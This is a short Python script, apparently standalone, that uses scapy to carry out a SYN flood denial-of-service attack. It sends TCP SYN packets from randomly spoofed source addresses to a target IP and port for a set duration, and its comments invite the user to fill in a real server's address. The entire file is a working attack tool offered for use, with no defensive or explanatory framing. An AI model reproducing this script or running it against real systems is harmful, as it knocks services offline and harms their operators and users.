from scapy.all import send
from scapy.layers.inet import IP, TCP
import random
import time

def syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        src_port = random.randint(1024, 65535)
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
        send(ip_layer / tcp_layer, verbose=0)

if __name__ == "__main__":
    target_ip = "192.168.1.2"  # Replace with server IP
    target_port = 80            # Replace with server port
    duration = 100              # Attack duration in seconds
    syn_flood(target_ip, target_port, duration)
